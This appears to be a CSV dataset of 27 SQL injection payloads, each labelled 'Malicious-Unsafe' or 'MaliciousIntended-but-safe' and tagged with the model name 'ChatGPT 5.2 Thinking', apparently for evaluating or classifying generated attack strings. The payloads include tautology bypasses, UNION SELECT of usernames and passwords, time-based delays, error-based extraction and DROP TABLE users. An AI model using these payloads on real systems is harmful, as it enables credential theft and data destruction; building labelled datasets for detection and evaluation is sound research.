Payload,Label,Model
' OR '1'='1,Malicious-Unsafe,ChatGPT 5.2 Thinking
"' UNION SELECT username, password FROM users--",Malicious-Unsafe,ChatGPT 5.2 Thinking
'; WAITFOR DELAY '0:0:5'--,Malicious-Unsafe,ChatGPT 5.2 Thinking
"' AND 1=CONVERT(int,@@version)--",Malicious-Unsafe,ChatGPT 5.2 Thinking
' AND 1=1--,Malicious-Unsafe,ChatGPT 5.2 Thinking
'; DROP TABLE users--,Malicious-Unsafe,ChatGPT 5.2 Thinking
' OR 1=1--,Malicious-Unsafe,ChatGPT 5.2 Thinking
0x27 OR 0x31=0x31--,Malicious-Unsafe,ChatGPT 5.2 Thinking
'; SELECT pg_sleep(5)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
"' AND 1=CONVERT(int,USER())--",MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
"' AND SUBSTRING(@@version,1,1)='5'--",Malicious-Unsafe,ChatGPT 5.2 Thinking
' OR 'a'='a,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
' OR 1=1-- -,Malicious-Unsafe,ChatGPT 5.2 Thinking
'//OR//1=1--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
' OR CAST('a' AS INT)=CAST('a' AS INT)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
' OR SLEEP(5)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",Malicious-Unsafe,ChatGPT 5.2 Thinking
"' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",Malicious-Unsafe,ChatGPT 5.2 Thinking
'; SELECT pg_sleep(10)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
' OR 1=1#,Malicious-Unsafe,ChatGPT 5.2 Thinking
' OR SLEEP(10)--,Malicious-Unsafe,ChatGPT 5.2 Thinking
"' UNION SELECT NULL, NULL, username, password FROM users--",Malicious-Unsafe,ChatGPT 5.2 Thinking
' OR 1=1/*,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
' AND (SELECT COUNT(*) FROM users) > 0--,Malicious-Unsafe,ChatGPT 5.2 Thinking
' OR pg_sleep(7)--,MaliciousIntended-but-safe,ChatGPT 5.2 Thinking
"' UNION SELECT database(), NULL--",Malicious-Unsafe,ChatGPT 5.2 Thinking
'; WAITFOR DELAY '0:0:10'--,Malicious-Unsafe,ChatGPT 5.2 Thinking
